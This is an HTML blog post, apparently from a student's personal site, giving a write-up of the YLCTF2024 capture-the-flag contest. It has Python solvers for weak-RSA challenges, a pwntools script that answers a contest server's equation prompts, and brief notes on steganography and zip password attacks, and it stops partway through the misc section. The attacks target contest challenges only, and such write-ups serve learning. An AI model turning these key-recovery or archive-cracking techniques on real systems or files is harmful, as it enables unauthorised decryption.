

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/biaotou.png">
  <link rel="icon" href="/img/biaotou.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="orange">
  <meta name="keywords" content="">
  
    <meta name="description" content="前言:总排23，新生赛道11  Round 1  crypto  [round1]BREAK e有范围，由于e的范围不算大，可以进行爆破得到e，求出d,解出flag 12345678910111213141516171819202122232425262728293031323334from Crypto.Util.number import *from gmpy2 import invert,">
<meta property="og:type" content="article">
<meta property="og:title" content="YLCTF2024">
<meta property="og:url" content="https://0ran9ewww.github.io/2024/10/17/ylctf/ylctf2024/index.html">
<meta property="og:site_name" content="0raN9e的笔记">
<meta property="og:description" content="前言:总排23，新生赛道11  Round 1  crypto  [round1]BREAK e有范围，由于e的范围不算大，可以进行爆破得到e，求出d,解出flag 12345678910111213141516171819202122232425262728293031323334from Crypto.Util.number import *from gmpy2 import invert,">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://0ran9ewww.github.io/images/ylctf/2024/back.png">
<meta property="article:published_time" content="2024-10-16T17:00:00.000Z">
<meta property="article:modified_time" content="2024-10-31T13:13:10.000Z">
<meta property="article:author" content="orange">
<meta property="article:tag" content="ctf">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://0ran9ewww.github.io/images/ylctf/2024/back.png">
  
  
  
  <title>YLCTF2024 - 0raN9e的笔记</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"0ran9ewww.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"mhU37D1jfBAPsc6SNIXmdLb0-gzGzoHsz","app_key":"z8mFsDgOSQqDw1luWGGbCaCR","server_url":"https://0ran9e.fun","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  
    
  



  
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>0raN9e的blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/images/ylctf/2024/back.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="YLCTF2024"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-10-17 01:00" pubdate>
          2024年10月17日 凌晨
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          11k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          92 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">YLCTF2024</h1>
            
              <p id="updated-time" class="note note-info" style="">
                
                  
                    本文最后更新于 2024年10月31日 晚上
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>前言:总排23，新生赛道11</p>
<h3 id="round-1"><a class="markdownIt-Anchor" href="#round-1"></a> Round 1</h3>
<h4 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> crypto</h4>
<h5 id="round1break"><a class="markdownIt-Anchor" href="#round1break"></a> [round1]BREAK</h5>
<p>e有范围，由于e的范围不算大，可以进行爆破得到e，求出d,解出flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert, gcd<br><br>p = <span class="hljs-number">112201812592436732390795120344111949417282805598314874949132199714697698933980025001138515893011073823715376332558632580563147885418631793000008453933543935617128269371275964779672888059389120797503550397834151733721290859419396400302434404551112484195071653351729447294368676427327217463094723449293599543541</span><br>q = <span class="hljs-number">177020901129489152716203177604566447047904210970788458377477238771801463954823395388149502481778049515384638107090852884561335334330598757905074879935774091890632735202395688784335456371467073899458492800214225585277983419966028073512968573622161412555169766112847647015717557828009246475428909355149575012613</span><br>c = <span class="hljs-number">2924474039245207571198784141495689937992753969132480503242933533024162740004938423057237165017818906240932582715571015311615140080805023083962661783117059081563515779040295926885648843373271315827557447038547354198633841318619550200065416569879422309228789074212184023902170629973366868476512892731022218074481334467704848598178703915477912059538625730030159772883926139645914921352787315268142917830673283253131667111029720811149494108036204927030497411599878456477044315081343437693246136153310194047948564341148092314660072088671342677689405603317615027453036593857501070187347664725660962477605859064071664385456</span><br><br>n = p * q<br><br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_primes</span>(<span class="hljs-params">start, end</span>):<br>    primes = []<br>    <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(start, end + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> isPrime(num):<br>            primes.append(num)<br>    <span class="hljs-keyword">return</span> primes<br><br><span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> generate_primes(<span class="hljs-number">55555</span>, <span class="hljs-number">66666</span>):<br>    <span class="hljs-keyword">if</span> gcd(e, phi) == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">try</span>:<br>            d = invert(e, phi)<br>            m = <span class="hljs-built_in">pow</span>(c, d, n)<br><br>           <br>            flag = long_to_bytes(m).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;找到 e = <span class="hljs-subst">&#123;e&#125;</span>, 解密后的 flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">break</span>  <br>        <span class="hljs-keyword">except</span> ZeroDivisionError:<br>            <span class="hljs-keyword">continue</span>  <span class="hljs-comment"># 如果 invert 失败，则继续尝试下一个 e</span><br>        <span class="hljs-keyword">except</span> UnicodeDecodeError:<br>            <span class="hljs-keyword">continue</span>  <span class="hljs-comment"># 如果解码失败，则继续尝试下一个 e</span><br><br><span class="hljs-comment"># YLCTF&#123;fbb6186c-6603-11ef-ba80-deb857dc15be&#125;</span><br></code></pre></td></tr></table></figure>
<h5 id="round1signrsa"><a class="markdownIt-Anchor" href="#round1signrsa"></a> [round1]signrsa</h5>
<p>RSA 模数 n1 和 n2 之间有公因子 q，从而使得可以分别对这两个模数进行分解，然后使用对应的私钥对密文进行解密，通过共模攻击解密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>n1 = <span class="hljs-number">18674375108313094928585156581138941368570022222190945461284402673204018075354069827186085851309806592398721628845336840532779579197302984987661547245423180760958022898546496524249201679543421158842103496452861932183144343315925106154322066796612415616342291023962127055311307613898583850177922930685155351380500587263611591893137588708003711296496548004793832636078992866149115453883484010146248683416979269684197112659302912316105354447631916609587360103908746719586185593386794532066034112164661723748874045470225129298518385683561122623859924435600673501186244422907402943929464694448652074412105888867178867357727</span><br>n2 = <span class="hljs-number">20071978783607427283823783012022286910630968751671103864055982304683197064862908267206049336732205051588820325894943126769930029619538705149178241710069113634567118672515743206769333625177879492557703359178528342489585156713623530654319500738508146831223487732824835005697932704427046675392714922683584376449203594641540794557871881581407228096642417744611261557101573050163285919971711214856243031354845945564837109657494523902296444463748723639109612438012590084771865377795409000586992732971594598355272609789079147061852664472115395344504822644651957496307894998467309347038349470471900776050769578152203349128951</span><br>e = <span class="hljs-number">65537</span><br>q = gmpy2.gcd(n1,n2)<br><span class="hljs-built_in">print</span>(q)<br><span class="hljs-comment"># 10210039189276167395636779557271057346691950991057423589319031237857569595284598319093522326723650646963251941930167018746859556383067696079622198265424441</span><br><br>p1 = n1 // q<br>p2 = n2 // q<br><br>d1 = gmpy2.invert(e,(q-<span class="hljs-number">1</span>)*(p1-<span class="hljs-number">1</span>))<br>d2 = gmpy2.invert(e,(q-<span class="hljs-number">1</span>)*(p2-<span class="hljs-number">1</span>))<br><br>c = <span class="hljs-number">17087345023822081623891751423634072935359933429883025338799316908134539732911987403379813791051721409025872046014445468757120127961953783792146805906255385927316168869306218712056692227481252348951991457948040258007096536015704568840248330993815252823424627958278346871867901249369170134106070695916355118499922945313335801615652226556995849239616859826762866841805915253356402366997693599487016453619500217382302173033771577307792501865322742699412806457301297719922487797626724702793650939979227432331932830374740050145956182452965260035182810782721888226896944881610943610565496963461471122317296063535420461202109</span><br>m = <span class="hljs-built_in">pow</span>(c,d2,n2)<br>m = <span class="hljs-built_in">pow</span>(m,d1,n1)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment"># b&#x27;YLCTF&#123;6567543c-e55b-4563-96ea-e7412e6834c2&#125;\n&#x27;</span><br></code></pre></td></tr></table></figure>
<h5 id="round1ezrsa"><a class="markdownIt-Anchor" href="#round1ezrsa"></a> [round1]ezrsa</h5>
<p>也是类共模攻击</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, inverse<br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> gcd<br><br>hint = <span class="hljs-number">74749248594786596691182255254760227675255640419811402596325257219264047909491854266322448991637721043565574231631858096560042784343181104155107927958136483921037567399591407065870395299938514992590953052021824859260647798407649617552126176876304021384535351268838294566489926141346712140945311688664783400430</span><br>n = <span class="hljs-number">146150746308368977558105420785404636106107297097656606561134260305844960246816673265377081884447744494438593580830134146856713782255534506122943914554490808124199966427121519694676728571857729213721192818898378912680306144869946238782714021401494162427357692727211780506245166118326256365562777182481342235649</span><br>c = <span class="hljs-number">12817272835509631426126672293486991243028800172545793296231214648592002361121076145968763436527652893903622692932403498323802323146995559960945697843044017192966527560462131618029760025950956635249851792561073659666145624864040328809279977987225518572316396679320621448299428750551755789817002220213790188515</span><br>e = <span class="hljs-number">65537</span><br><br>p = gcd(<span class="hljs-built_in">pow</span>(<span class="hljs-number">20240918</span>, e, n) - hint, n)<br>q = n // p<br><br>d = inverse(e, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))<br>flag = long_to_bytes(<span class="hljs-built_in">pow</span>(c, d, n))<br><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment"># b&#x27;YLCTF&#123;12f142fc-351d-486f-aaa6-b64ebf3e7bdf&#125;\n&#x27;</span><br></code></pre></td></tr></table></figure>
<h5 id="round1ra3"><a class="markdownIt-Anchor" href="#round1ra3"></a> [round1]r(A)=3</h5>
<p>典型的矩阵问题，进行交互循环300次得到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>p = remote(<span class="hljs-string">&#x27;challenge.yuanloo.com&#x27;</span>, <span class="hljs-number">23115</span>)<br><br><span class="hljs-keyword">for</span> attempt <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">300</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Attempt <span class="hljs-subst">&#123;attempt + <span class="hljs-number">1</span>&#125;</span>...&quot;</span>)  <br><br>        line = p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>.encode())<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Received: <span class="hljs-subst">&#123;line.decode().strip()&#125;</span>&quot;</span>)<br><br>        line = p.recvuntil(<span class="hljs-string">&quot;x=&quot;</span>.encode())<br>        equation_str = line.decode().strip()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Received: <span class="hljs-subst">&#123;equation_str&#125;</span>&quot;</span>)<br><br>        equations = equation_str.split(<span class="hljs-string">&quot;\n&quot;</span>)<br>        A = []<br>        B = []<br><br>        <span class="hljs-keyword">for</span> i, eq <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(equations):<br>            <span class="hljs-keyword">if</span> i == <span class="hljs-built_in">len</span>(equations) - <span class="hljs-number">1</span>:  <span class="hljs-comment"># 忽略最后一行</span><br>                <span class="hljs-keyword">continue</span><br>            left, right = eq.split(<span class="hljs-string">&quot;=&quot;</span>)<br>            B.append(<span class="hljs-built_in">float</span>(right.strip()))<br><br>            <span class="hljs-comment"># 提取系数</span><br>            coefficients = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]  <span class="hljs-comment"># 对应 x, y, z 的系数</span><br>            <span class="hljs-keyword">for</span> term <span class="hljs-keyword">in</span> left.split(<span class="hljs-string">&quot;+&quot;</span>):<br>                term = term.strip()<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;x&quot;</span> <span class="hljs-keyword">in</span> term:<br>                    coefficients[<span class="hljs-number">0</span>] = <span class="hljs-built_in">float</span>(term.split(<span class="hljs-string">&quot;*&quot;</span>)[<span class="hljs-number">0</span>]) <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;*&quot;</span> <span class="hljs-keyword">in</span> term <span class="hljs-keyword">else</span> <span class="hljs-number">1.0</span><br>                <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;y&quot;</span> <span class="hljs-keyword">in</span> term:<br>                    coefficients[<span class="hljs-number">1</span>] = <span class="hljs-built_in">float</span>(term.split(<span class="hljs-string">&quot;*&quot;</span>)[<span class="hljs-number">0</span>]) <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;*&quot;</span> <span class="hljs-keyword">in</span> term <span class="hljs-keyword">else</span> <span class="hljs-number">1.0</span><br>                <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;z&quot;</span> <span class="hljs-keyword">in</span> term:<br>                    coefficients[<span class="hljs-number">2</span>] = <span class="hljs-built_in">float</span>(term.split(<span class="hljs-string">&quot;*&quot;</span>)[<span class="hljs-number">0</span>]) <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;*&quot;</span> <span class="hljs-keyword">in</span> term <span class="hljs-keyword">else</span> <span class="hljs-number">1.0</span><br><br>            A.append(coefficients)<br><br>        A = np.array(A)<br>        B = np.array(B)<br><br>        solution = np.linalg.solve(A, B)<br><br>        <br>        p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(solution[<span class="hljs-number">0</span>])))  <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;solution[<span class="hljs-number">0</span>]&#125;</span>&quot;</span>)<br>        line = p.recvuntil(<span class="hljs-string">&quot;y=&quot;</span>.encode())<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Received: <span class="hljs-subst">&#123;line.decode().strip()&#125;</span>&quot;</span>)<br>        p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(solution[<span class="hljs-number">1</span>])))  <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;solution[<span class="hljs-number">1</span>]&#125;</span>&quot;</span>)<br>        line = p.recvuntil(<span class="hljs-string">&quot;z=&quot;</span>.encode())<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Received: <span class="hljs-subst">&#123;line.decode().strip()&#125;</span>&quot;</span>)<br>        p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(solution[<span class="hljs-number">2</span>])))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;solution[<span class="hljs-number">2</span>]&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Attempt <span class="hljs-subst">&#123;attempt + <span class="hljs-number">1</span>&#125;</span> failed: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
<h5 id="round1threecry"><a class="markdownIt-Anchor" href="#round1threecry"></a> [round1]threecry</h5>
<p>参考文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/luochen2436/article/details/131948093">https://blog.csdn.net/luochen2436/article/details/131948093</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>e = <span class="hljs-number">0xe18e</span><br>crypto05= <span class="hljs-number">16623038441079077059861502314553840945014390827451667324209537222817794990697456726185616589892380248771957751215156366431853682717356212256182541599038824352426429058283605462766315213017886613935143369630579915129950428539117781616821575904280675596170305716041161748779293269633614559889401304768245038227061</span><br>crypto03= <span class="hljs-number">7370478569029817135349016311298954172270465460003018672225010525611372855698643108316167758095660953716705265165460646442696451806405620591202977137450538604803993325516057226246866037605963589652887018894515430484657967483718879717967258257252134148706147029651520914313120373591263784166639605955378617102045</span><br>number1 = <span class="hljs-number">6035830951309638186877554194461701691293718312181839424149825035972373443231514869488117139554688905904333169357086297500189578624512573983935412622898726797379658795547168254487169419193859102095920229216279737921183786260128443133977458414094572688077140538467216150378641116223616640713960883880973572260683</span><br>number2 = <span class="hljs-number">20163906788220322201451577848491140709934459544530540491496316478863216041602438391240885798072944983762763612154204258364582429930908603435291338810293235475910630277814171079127000082991765275778402968190793371421104016122994314171387648385459262396767639666659583363742368765758097301899441819527512879933947</span><br><br>a_near = gmpy2.iroot(number2//<span class="hljs-number">325</span>,<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">while</span> number2 % gmpy2.next_prime(<span class="hljs-number">13</span>*a_near)!=<span class="hljs-number">0</span>:<br>    a_near = gmpy2.next_prime(a_near)<br>p = gmpy2.next_prime(<span class="hljs-number">13</span>*a_near)<br>q = number2//p<br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>t = gmpy2.gcd(e, phi)<br>d = gmpy2.invert(e // t, phi)<br>m2 = gmpy2.iroot(<span class="hljs-built_in">pow</span>(crypto05, d, number2), t)[<span class="hljs-number">0</span>]<br>flag2 = long_to_bytes(m2)<br><br>d1 = gmpy2.invert(number1, phi)<br>m1 = <span class="hljs-built_in">pow</span>(crypto03, d1, number2)<br>flag1 = long_to_bytes(m1)<br><span class="hljs-built_in">print</span>(flag1 + flag2)<br><span class="hljs-comment"># b&#x27;YLCTF&#123;8d547f68-f394-4254-9ada-2dc306862b66&#125;\n&#x27;</span><br></code></pre></td></tr></table></figure>
<h4 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h4>
<h5 id="签到-打卡小能手"><a class="markdownIt-Anchor" href="#签到-打卡小能手"></a> [签到] 打卡小能手</h5>
<p><img src="/../../images/ylctf/2024/%E6%89%93%E5%8D%A1%E5%B0%8F%E5%8A%A9%E6%89%8B.png" srcset="/img/loading.gif" lazyload alt="打卡小助手"></p>
<h5 id="round-1-hide_png"><a class="markdownIt-Anchor" href="#round-1-hide_png"></a> [Round 1] hide_png</h5>
<p>给的图片用stegsolve来看，有点模糊但是可以看看</p>
<p><img src="/../../images/ylctf/2024/hide_png.png" srcset="/img/loading.gif" lazyload alt="hide_png"></p>
<p>flag没存忘了</p>
<h5 id="round-1-pngorzip"><a class="markdownIt-Anchor" href="#round-1-pngorzip"></a> [Round 1] pngorzip</h5>
<p><img src="/../../images/ylctf/2024/pngorzip.png" srcset="/img/loading.gif" lazyload alt="pngorzip"></p>
<p>save bin形式得到zip，010去掉114514???后面的冗杂内容进行掩码攻击得到giao，解压得到flag</p>
<p>YLCTF{d359d6e4-740a-49cf-83eb-5b0308f09c8c}</p>
<h5 id="round-1-plain_crack"><a class="markdownIt-Anchor" href="#round-1-plain_crack"></a> [Round 1] plain_crack</h5>
<p>尝试再写个压缩包进行明文攻击</p>
